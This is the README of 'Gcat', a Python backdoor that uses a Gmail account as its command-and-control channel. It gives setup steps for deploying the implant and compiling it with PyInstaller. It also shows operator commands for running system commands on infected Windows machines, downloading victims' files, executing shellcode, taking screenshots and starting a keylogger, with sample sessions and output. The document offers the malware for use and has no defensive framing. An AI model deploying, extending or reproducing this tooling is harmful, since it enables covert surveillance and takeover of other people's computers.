Gcat
====
A stealthy Python based backdoor that uses Gmail as a command and control server

Setup 
=====
For this to work you need:
- A Gmail account (**Use a dedicated account! Do not use your personal one!**)
- Turn on "Allow less secure apps" under the security settings of the account

This repo contains two files:
- ```gcat.py``` a script that's used to enumerate and issue commands to available clients
- ```implant.py``` the actual backdoor to deploy

In both files, edit the ```gmail_user``` and ```gmail_pwd``` variables with the username and password of the account you previously setup.

You're probably going to want to compile ```implant.py``` into an executable using [Pyinstaller](https://github.com/pyinstaller/pyinstaller)

Usage
=====
```
Gcat

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -id ID                Client to target
  -jobid JOBID          Job id to retrieve

  -list                 List available clients
  -info                 Retrieve info on specified client

Commands:
  Commands to execute on an implant

  -cmd CMD              Execute a system command
  -download PATH        Download a file from a clients system
  -exec-shellcode FILE  Execute supplied shellcode on a client
  -screenshot           Take a screenshot
  -lock-screen          Lock the clients screen
  -force-checkin        Force a check in
  -start-keylogger      Start keylogger
  -stop-keylogger       Stop keylogger
```

- Once you've deployed the backdoor on a couple of systems, you can check available clients using the list command:
```
#~ python gcat.py -list
f964f907-dfcb-52ec-a993-543f6efc9e13 Windows-8-6.2.9200-x86
90b2cd83-cb36-52de-84ee-99db6ff41a11 Windows-XP-5.1.2600-SP3-x86
```
The output is a UUID string that uniquely identifies the system and the OS the implant is running on


- Let's issue a command to an implant:
```
#~ python gcat.py -id 90b2cd83-cb36-52de-84ee-99db6ff41a11 -cmd 'ipconfig /all'
[*] Command sent successfully with jobid: SH3C4gv
```
Here we are telling ```90b2cd83-cb36-52de-84ee-99db6ff41a11``` to execute ```ipconfig /all```, the script then outputs the ```jobid``` that we can use to retrieve the output of that command

- Lets get the results!
```
#~ python gcat.py -id 90b2cd83-cb36-52de-84ee-99db6ff41a11 -jobid SH3C4gv     
DATE: 'Tue, 09 Jun 2015 06:51:44 -0700 (PDT)'
JOBID: SH3C4gv
FG WINDOW: 'Command Prompt - C:\Python27\python.exe implant.py'
CMD: 'ipconfig /all'

- That's the gist of it! But you can do much more as you can see from the usage of the script! ;)

To Do
=====

- Multi-platform support
- Command to upload files
- Transport crypto & obfuscation
